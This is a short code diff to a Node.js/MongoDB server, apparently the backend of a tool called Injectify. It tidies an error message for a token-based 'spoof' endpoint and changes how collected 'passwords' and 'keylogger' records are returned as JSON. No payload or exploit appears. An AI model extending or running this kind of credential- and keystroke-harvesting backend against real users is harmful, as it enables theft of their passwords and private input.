@@ -1793,7 +1793,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
       res.status(400).send(JSON.stringify({
         title: 'Bad request',
         message: 'Specify a token, project name and index to return in request',
-        format: 'https://injectify.samdd.me/api/spoof/PROJECT_NAME?index=INDEX&token=GITHUB_TOKEN'
+        format: '/api/spoof/PROJECT_NAME?index=INDEX&token=GITHUB_TOKEN'
       }, null, '    '))
     }
   })
@@ -2209,16 +2209,12 @@ MongoClient.connect(config.mongodb, (err, client) => {
           }
         } else if (json.passwords && json.keylogger) {
           if (type == 'keylogger') {
-            json = {
-              keylogger: json.keylogger
-            }
+            json = json.keylogger
           } else {
-            json = {
-              passwords: json.passwords
-            }
+            json = json.passwords
           }
           stringified = JSON.stringify(json, null, '    ')
-          if (json[type].length == 0) {
+          if (!json || !json.length) {
             res.status(206).send(stringified)
           } else {
             res.send(stringified)
